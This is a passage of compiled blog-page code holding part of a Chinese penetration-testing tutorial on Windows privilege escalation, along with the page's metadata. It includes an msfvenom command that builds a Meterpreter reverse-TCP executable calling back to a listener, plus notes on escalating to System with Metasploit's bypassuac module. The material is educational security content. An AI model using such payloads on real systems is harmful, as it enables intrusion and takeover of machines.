loading="lazy">​</p></li></ol><h5 id="利用msf的-bypassuac-模块" tabindex="-1"><a class="header-anchor" href="#利用msf的-bypassuac-模块"><span>利用MSF的 bypassuac 模块</span></a></h5><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">msfvenom</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -p</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> windows/meterpreter/reverse_tcp</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> lhost=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">192.168.61.20</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> lport=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">6666</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -f</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> exe</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> -o</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> tests.exe</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">  #lhostiplport</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>​<img src="'+y+'" alt="image" loading="lazy">​</p><p>​<img src="'+m+'" alt="image" loading="lazy">​</p><p>​<img src="'+A+'" alt="image" loading="lazy">​</p><p>​<img src="'+u+'" alt="image" loading="lazy">​</p><p>​<img src="'+b+'" alt="image" loading="lazy">​</p><p>​<img src="'+F+'" alt="image" loading="lazy">​</p><p>​<img src="'+v+'" alt="image" loading="lazy">​</p><p>通过一系列的前期渗透测试，已经获得了目标机器的meterpreter shell,当前权限为普通用户权限，可以尝试获取系统的System权限。</p><p>​<img src="'+B+'" alt="MSF-bypassuac" loading="lazy">​</p><h2 id="_4-windows错误系统配置提权" tabindex="-1"><a class="header-anchor" href="#_4-windows错误系统配置提权"><span>4.windows错误系统配置提权</span></a></h2><p>...</p><p>‍</p>',55)]))}]]),f=JSON.parse('{"path":"/perm/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83.html","title":"windows系统提权","lang":"zh-CN","frontmatter":{"title":"windows系统提权","index":true,"icon":"w","isOriginal":true,"date":"2024-09-23T00:00:00.000Z","order":1,"category":["渗透测试"],"tag":["渗透测试","windows系统提权"],"description":"windows提权分类 1.系统漏洞提权(Linux、Windows)内核提权 3.第三方软件/服务提权 2.数据库提权 4.系统配置错误提权 windows提权概述 提权，顾名思义就是提升权限，当我们getshell一个网站之后，大部分情况下我们的权限是非常低的,这时就需要利用提权，让原本的低权限（如只允许列目录）→高权限（拥有修改文件的能力）权限提...","head":[["meta",{"property":"og:url","content":"https://mister-hope.github.io/blog/perm/%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/windows%E7%B3%BB%E7%BB%9F%E6%8F%90%E6%9D%83.html"}],["meta",{"property":"og:site_name","content":"卷卷"}],["meta",{"property":"og:title","content":"windows系统提权"}],["meta",{"property":"og:description","content":"windows提权分类 1.系统漏洞提权(Linux、Windows)内核提权 3.第三方软件/服务提权 2.数据库提权 4.系统配置错误提权 windows提权概述 提权，顾名思义就是提升权限，当我们getshell一个网站之后，大部分情况下我们的权限是非常低的,这时就需要利用提权，让原本的低权限（如只允许列目录）→高权限（拥有修改文件的能力）权限提..."}],["meta",{"property":"og:type","content":"article"}],["meta",{"property":"og:locale","content":"zh-CN"}],["meta",{"property":"og:updated_time","content":"2025-01-12T08:22:33.000Z"}],["meta",{"property":"article:tag","content":"渗透测试"}],["meta",{"property":"article:tag","content":"windows系统提权"}],["meta",{"property":"article:published_time","content":"2024-09-23T00:00:00.000Z"}],["meta",{"property":"article:modified_time","content":"2025-01-12T08:22:33.000Z"}],["script",{"type":"application/ld+json"},"{\\"@context\\":\\"https://schema.org\\",\\"@type\\":\\"Article\\",\\"headline\\":\\"windows系统提权\\",\\"image\\":[\\"\\"],\\"datePublished\\":\\"2024-09-23T00:00:00.000Z\\",\\"dateModified\\":\\"2025-01-12T08:22:33.000Z\\",\\"author\\":[{\\"@type\\":\\"Person\\",\\"name\\":\\"卷卷\\"}]}"]]},"headers":[{"level":2,"title":"3.windows bypass UAC提权","slug":"_3-windows-bypass-uac提权","link":"#_3-windows-bypass-uac提权","children":[]},{"level":2,"title":"4.windows错误系统配置提权","slug":"_4-windows错误系统配置提权","link":"#_4-windows错误系统配置提权","children":[]}],"git":{"createdTime":1736670153000,"updatedTime":1736670153000,"contributors":[{"name":"youze","username":"youze","email":"youze27@163.com","commits":1,"url":"https://github.com/youze"}]},"readingTime":{"minutes":6.34,"words":1902},"filePathRelative":"perm/权限提升/windows系统提权.md","localizedDate":"2024年9月23日","excerpt":"<h4>windows提权分类</h4>\\n<p>1.系统漏洞提权(Linux、Windows)内核提权<br>\\n3.第三方软件/服务提权<br>\\n2.数据库提权<br>\\n4.系统配置错误提权</p>\\n<h4>windows提权概述</h4>\\n<p>提权，顾名思义就是提升权限，当我们getshell一个网站之后，大部分情况下我们的权限是非常低的,这时就需要利用提权，让原本的低权限（如只允许列目录）→高权限（拥有修改文件的能力）权限提升后，对接下来的渗透有很大帮助。<br>\\nwindows:</p>\\n<p>user--&gt;System<br>\\nuser--&gt;Administrator</p>","autoDesc":true}')}}]);